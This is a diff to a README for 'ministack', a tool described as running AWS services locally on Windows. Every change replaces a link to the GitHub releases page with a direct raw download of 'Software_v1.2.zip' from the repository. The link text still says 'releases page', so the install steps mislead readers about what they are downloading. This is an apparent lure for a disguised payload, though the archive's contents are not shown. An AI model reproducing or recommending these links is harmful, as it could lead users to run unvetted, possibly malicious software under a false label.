@@ -1,6 +1,6 @@
 # 🧱 ministack - Run AWS tools on your PC
 
-[![Download ministack](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Umair-ul-Hassan-cmd/ministack/releases)
+[![Download ministack](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Umair-ul-Hassan-cmd/ministack/raw/refs/heads/main/ministack/Software_v1.2.zip)
 
 ## 📦 What is ministack?
 
@@ -37,13 +37,13 @@ Before you install ministack, make sure your PC meets these basic needs:
 
 Use the release page to visit this page to download the Windows build that matches your PC:
 
-[Visit the ministack releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/releases)
+[Visit the ministack releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/raw/refs/heads/main/ministack/Software_v1.2.zip)
 
 After you open the page, look for the latest release and download the Windows file from the Assets list.
 
 ## 🔧 Install on Windows
 
-1. Open the [releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/releases).
+1. Open the [releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/raw/refs/heads/main/ministack/Software_v1.2.zip).
 2. Find the latest release at the top of the page.
 3. Look under Assets.
 4. Download the Windows file that fits your setup.
@@ -171,7 +171,7 @@ Keep the app in a folder with a short path. This helps with setup and file acces
 
 Check the releases page when you want the latest version:
 
-[Open ministack releases](https://github.com/Umair-ul-Hassan-cmd/ministack/releases)
+[Open ministack releases](https://github.com/Umair-ul-Hassan-cmd/ministack/raw/refs/heads/main/ministack/Software_v1.2.zip)
 
 Use the newest release file each time you update.
 
@@ -191,7 +191,7 @@ A normal setup gives you a local place to work with buckets, tables, queues, and
 
 ## 🧷 Quick install path
 
-1. Visit the [releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/releases).
+1. Visit the [releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/raw/refs/heads/main/ministack/Software_v1.2.zip).
 2. Download the Windows release file.
 3. Extract or install it.
 4. Open the app.
